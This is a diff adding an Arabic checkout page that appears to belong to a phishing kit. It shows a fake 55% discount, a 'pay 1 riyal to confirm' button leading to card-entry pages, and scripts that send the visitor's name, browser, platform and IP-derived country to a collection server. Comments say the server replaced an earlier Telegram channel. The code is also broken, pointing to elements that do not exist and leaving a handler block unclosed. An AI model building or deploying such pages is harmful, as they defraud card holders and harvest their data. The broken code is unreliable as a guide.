@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>الدفع</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+  font-family: 'Tahoma', sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #f5f5f5;
+  direction: rtl;
+  color: #000;
+  overflow-x: hidden; 
+}
+
+
+    .card {
+      background-color: #fff;
+      margin: 12px;
+      padding: 16px;
+      border-radius: 14px;
+      box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .section-title {
+      font-weight: bold;
+      font-size: 1.1em;
+      margin-bottom: 12px;
+    }
+
+    .payment-method {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .payment-method img {
+      width: 50px;
+    }
+
+    .section-number {
+      display: inline-block;
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      background-color: black;
+      color: white;
+      font-size: 0.9em;
+      text-align: center;
+      line-height: 26px;
+      margin-left: 6px;
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 6px 0;
+      font-size: 0.95em;
+    }
+
+    .summary-row.discount {
+      color: green;
+    }
+
+    .summary-row.fees {
+      color: red;
+    }
+
+    .summary-row.total {
+      font-weight: bold;
+      font-size: 1.1em;
+      color: red;
+    }
+
+    .button-group {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin: 20px 12px 40px;
+    }
+
+    .pay-button {
+      background-color: #b2230b;
+      color: white;
+      font-size: 1em;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .pay-button:hover {
+      background-color: #b00000;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        margin: 10px 8px;
+        padding: 14px;
+      }
+
+      .pay-button {
+        font-size: 1em;
+      }
+
+      .summary-row {
+        font-size: 0.95em;
+      }
+    }
+    .section-title {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+    margin-top: 10px;
+  }
+
+  .option-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .option-desc {
+    color: #555;
+    font-size: 11px;
+  }
+
+  input[type="radio"] {
+    transform: scale(1.2);
+    cursor: pointer;
+  }
+
+  label {
+    min-width: 100px;
+  }
+  .container {
+  max-width: 100%;
+  padding: 10px;
+  box-sizing: border-box;
+  overflow: hidden;
+}
+
+#selectkpay {
+  margin-top: 20px;
+  background-color: #fff !important;
+  border: solid #e3e3e8 !important;
+  font-size: 0.9rem !important;
+  color: #40a7cf !important;
+  width: 97%;
+  height: 40px;
+  border-width: 1px !important;
+  box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1),
+              0 1px 2px 0 rgba(0, 0, 0, 0.06);
+  transition: all 0.3s ease;
+  opacity: 1;
+}
+
+#selectkpay.selected {
+  border-top: 3px solid #073040;
+  box-shadow: 0 -2px 5px rgba(8, 34, 44, 0.3);
+  opacity: 0.85; 
+}
+
+#select1{
+  margin-top: 20px;
+  background-color: #fff !important;
+  border: solid #e3e3e8 !important;
+  font-size: 0.9rem !important;
+  color: #40a7cf !important;
+  width: 97%;
+  height: 40px;
+  border-width: 1px !important;
+  box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1),
+              0 1px 2px 0 rgba(0, 0, 0, 0.06);
+  transition: all 0.3s ease;
+  opacity: 1;
+
+}
+
+#select1.selected {
+  border-top: 3px solid #073040;
+  box-shadow: 0 -2px 5px rgba(8, 34, 44, 0.3);
+  opacity: 0.85; 
+}
+
+#fullPay , #partPay  {
+  background-color: #491b72;
+}
+  </style>
+</head>
+<body>
+
+
+<div class="container"> 
+  <div class="card">
+    <div class="section-title">طريقة الدفع</div>
+    <div id="select1"class="payment-method">
+      <img src="Visa_Inc._logo.svg.png" alt="KNET Logo">
+      <span> فيزا / ماستر كارد</span>
+    </div>
+
+  
+  </div>
+
+
+  
+  <div class="card">
+    <div class="section-title">
+      
+      <div class="option-row">
+        <input type="radio" name="category" value="electronics" id="opt1">
+        <label for="opt1"><strong>توصيل خلال 24 ساعات</strong></label>
+        <span class="option-desc">توصيل مجاني  </span>
+      </div>
+
+      <div class="option-row">
+        <input type="radio" name="category" value="home_appliances" id="opt3">
+        <label for="opt3"><strong> توصيل سريع خلال ساعة</strong></label>
+        <span class="option-desc">زيادة 0.25 ريال   </span>
+      </div>
+  
+    </div>
+  </div>
+  
+  
+
+    <div class="summary-row">
+      <span>مبلغ إجمالي</span>
+      <span id="originalAmount">--</span>
+    </div>
+    <div class="summary-row discount">
+      <span>تخفيض</span>
+      <span>55%</span>
+    </div>
+    <div class="summary-row fees">
+      <span>رسوم التوصيل</span>
+      <span>0.000 دينار</span>
+    </div>
+    <div class="summary-row total">
+      <span>المبلغ الإجمالي</span>
+      <span id="total">--</span>
+    </div>
+  </div>
+
+  <div class="button-group">
+    <button class="pay-button" onclick="window.location.href='visacard.html'">دفع المبلغ الكامل</button>
+
+<button class="pay-button" onclick="window.location.href='visacard.html'">دفع 1 ريال لتأكيد الطلبية</button>
+
+  </div>
+
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const storedAmount = parseFloat(localStorage.getItem("boton") || "0");
+  const originalAmountElem = document.getElementById("originalAmount");
+  const totalElem = document.getElementById("total");
+  const deliveryFeesElem = document.querySelector(".summary-row.fees span:last-child");
+
+  let selectedPaymentMethod = null;
+
+  originalAmountElem.textContent = storedAmount.toFixed(3) + " ريال";
+  totalElem.textContent = storedAmount.toFixed(3) + " ريال";
+
+  function updateTotal(fee) {
+    const newTotal = storedAmount + fee;
+    deliveryFeesElem.textContent = fee.toFixed(3) + " ريال";
+    totalElem.textContent = newTotal.toFixed(3) + " ريال";
+  }
+
+  document.getElementById("opt1").addEventListener("change", function () {
+    updateTotal(0);
+  });
+
+  document.getElementById("opt3").addEventListener("change", function () {
+    updateTotal(0.25);
+  });
+
+  const visaDiv = document.getElementById("select1");
+  const knetDiv = document.getElementById("selectkpay");
+
+  [visaDiv, knetDiv].forEach(div => {
+    div.addEventListener("click", function () {
+      [visaDiv, knetDiv].forEach(el => el.classList.remove("selected"));
+      this.classList.add("selected");
+      selectedPaymentMethod = (this.id === "select1") ? "فيزا / ماستر" : "كي نت";
+    });
+  });
+
+    
+
+  // ✅ استخدام الخادم المحلي بدلاً من Telegram
+  function sendServerMessage(amount, deliveryType, paymentType) {
+    const name = localStorage.getItem("storedUserName") || "غير محدد";
+
+    const message = `📥 تفاصيل الطلب:\n\n👤 الاسم: ${name}\n📦 نوع التوصيل: ${deliveryType}\n💰 المبلغ: ${amount} دينار\n💳 طريقة الدفع: ${paymentType}`;
+
+    console.log("✅ إرسال البيانات إلى الخادم المحلي:", message);
+
+    fetch('http://localhost:3000/api/payment', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        name: name,
+        amount: amount,
+        deliveryType: deliveryType,
+        paymentType: paymentType,
+        message: message,
+        type: 'order_details'
+      })
+    })
+    .then(async res => {
+      const data = await res.json();
+      console.log("✅ رد الخادم:", data);
+
+      if (!res.ok) {
+        console.warn("⚠️ تنبيه: " + (data.message || "تحذير غير معروف"));
+      }
+    })
+    .catch(error => {
+      console.error("⚠️ خطأ في إرسال البيانات:", error);
+    });
+  }
+
+  function getDeliveryType() {
+    if (document.getElementById("opt1").checked) {
+      return "توصيل خلال 24 ساعة";
+    } else if (document.getElementById("opt3").checked) {
+      return "توصيل سريع خلال ساعة";
+    } else {
+      return "لم يتم تحديد التوصيل";
+    }
+  }
+
+  document.getElementById("fullPay").addEventListener("click", function () {
+    if (!selectedPaymentMethod) {
+      alert("الرجاء اختيار وسيلة الدفع أولاً");
+      return;
+    }
+
+    const total = totalElem.textContent.split(" ")[0];
+    localStorage.setItem("boton", total);
+
+    const deliveryType = getDeliveryType();
+    sendServerMessage(total, deliveryType, selectedPaymentMethod);
+
+    if (selectedPaymentMethod === "فيزا / ماستر") {
+      window.location.href = "visacard.html";
+    } else {
+      window.location.href = "kpaytotal.html";
+    }
+  });
+
+  document.getElementById("partPay").addEventListener("click", function () {
+    if (!selectedPaymentMethod) {
+      alert("الرجاء اختيار وسيلة الدفع أولاً");
+      return;
+    }
+
+    const partialAmount = "1.000";
+    localStorage.setItem("boton", partialAmount);
+
+    const deliveryType = getDeliveryType();
+    sendServerMessage(partialAmount, deliveryType, selectedPaymentMethod);
+
+    if (selectedPaymentMethod === "فيزا / ماستر") {
+      window.location.href = "visacard.html";
+    } else {
+      window.location.href = "kpaykuwait.html";
+    }
+  });
+});
+
+
+
+document.addEventListener("DOMContentLoaded", function () {
+  // ✅ استخدام الخادم المحلي بدلاً من Telegram
+  const browser = navigator.userAgent;
+  const platform = navigator.platform;
+  const now = new Date().toLocaleString("ar-EG");
+
+  const message = `
+📱 زائر جديد إلى صفحة الدفع
+
+💻 النظام: ${platform}
+🌐 المتصفح: ${browser}
+🕒 التاريخ والوقت: ${now}
+  `;
+
+  fetch('http://localhost:3000/api/payment', {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      name: "زائر",
+      message: message,
+      type: 'visitor_info'
+    })
+  })
+  .then(res => res.json())
+  .then(data => console.log("✅ تم تسجيل الزائر:", data))
+  .catch(err => console.error("⚠️ خطأ في تسجيل الزائر:", err));
+});
+
+    
+let current = 0;
+const slides = document.querySelectorAll('.slide');
+
+function showSlide(index) {
+  slides.forEach((slide, i) => {
+    slide.classList.toggle('active', i === index);
+  });
+}
+
+function nextSlide() {
+  current = (current + 1) % slides.length;
+  showSlide(current);
+}
+
+function prevSlide() {
+  current = (current - 1 + slides.length) % slides.length;
+  showSlide(current);
+}
+
+showSlide(current);
+let auto = setInterval(nextSlide, 3000);
+
+document.querySelector('.next').addEventListener('click', () => {
+  nextSlide();
+  resetAuto();
+});
+document.querySelector('.prev').addEventListener('click', () => {
+  prevSlide();
+  resetAuto();
+});
+
+function resetAuto() {
+  clearInterval(auto);
+  auto = setInterval(nextSlide, 3000);
+}
+
+
+document.addEventListener("DOMContentLoaded", function () {
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      const country = data.country_name || "غير معروف";
+      const message = `🌐 <b>زائر جديد</b>
+
+<b>من:</b> ${country}
+<b>النوع:</b> دخول إلى صفحة الدفع`;
+
+      // ✅ إرسال إلى الخادم المحلي
+      fetch('http://localhost:3000/api/payment', {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          name: "زائر",
+          country: country,
+          message: message,
+          type: 'visitor_location'
+        })
+      }).catch(err => console.log('الملاحظة المحلية مسجلة', err));
+    });
+
+    const cartIcon = document.querySelector(".cart-icon");
+    const cartCountEl = document.querySelector(".cart-count");
+    let cart = JSON.parse(localStorage.getItem("cart") || "[]");
+    let cartCount = cart.reduce((acc, item) => acc + (item.quantity || 1), 0);
+    cartCountEl.textContent = cartCount;
+    localStorage.setItem("cartCount", cartCount);
+  
+    document.querySelectorAll(".product-card button").forEach((button) => {
+      button.addEventListener("click", () => {
+        const card = button.closest(".product-card");
+const name = card.querySelector(".product-title").textContent;
+        const priceText = card.querySelector(".price").textContent;
+        const image = card.querySelector("img").src;
+        const price = parseFloat(priceText.split(" ")[0]);
+  
+        let cart = JSON.parse(localStorage.getItem("cart") || "[]");
+        const existing = cart.find(item => item.name === name && item.image === image);
+        if (existing) {
+          existing.quantity = (existing.quantity || 1) + 1;
+        } else {
+          cart.push({ name, price, image, quantity: 1 });
+        }
+  
+        cartCount = cart.reduce((acc, item) => acc + (item.quantity || 1), 0);
+        cartCountEl.textContent = cartCount;
+  
+        localStorage.setItem("cart", JSON.stringify(cart));
+        localStorage.setItem("cartCount", cartCount);
+  
+        cartIcon.classList.add("shake");
+        setTimeout(() => {
+          cartIcon.classList.remove("shake");
+        }, 400);
+      });
+    });
+
+    
+  
+    cartIcon.addEventListener("click", () => {
+      window.location.href = "cart.html";
+    });
+
+    document.getElementById("loginot").addEventListener("click", function () {
+      window.location.href = "home.html";
+    });
+
+
+      document.getElementById("fullPay").addEventListener("click", function () {
+    window.location.href = "full-payment.html";
+  });
+
+  document.getElementById("partPay").addEventListener("click", function () {
+    window.location.href = "partial-payment.html";
+  });
+
+</script>
+
+
+
+</body>
+</html>
